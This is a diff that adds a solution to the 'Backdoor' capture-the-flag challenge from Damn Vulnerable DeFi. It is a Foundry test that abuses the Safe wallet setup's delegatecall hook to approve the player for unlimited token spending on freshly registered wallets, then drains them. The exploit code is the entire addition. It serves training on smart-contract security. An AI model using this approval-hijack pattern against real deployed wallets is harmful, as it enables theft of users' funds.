@@ -8,6 +8,10 @@ import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxie
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {Attack} from "./Attack.t.sol";
+
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -70,7 +74,32 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack();
+
+        for (uint8 i = 0; i < 4; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeCall(Safe.setup, (
+                owners,
+                uint256(1),
+                address(attack),
+                abi.encodeWithSelector(Attack.approve.selector, token, player, type(uint256).max),
+                address(0),
+                address(0),
+                uint256(0),
+                payable(address(0))
+            ));
+
+            SafeProxy createdProxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                uint256(1),
+                IProxyCreationCallback(address(walletRegistry))
+            );
+
+            token.transferFrom(address(createdProxy), recovery, 10e18);
+        }
     }
 
     /**
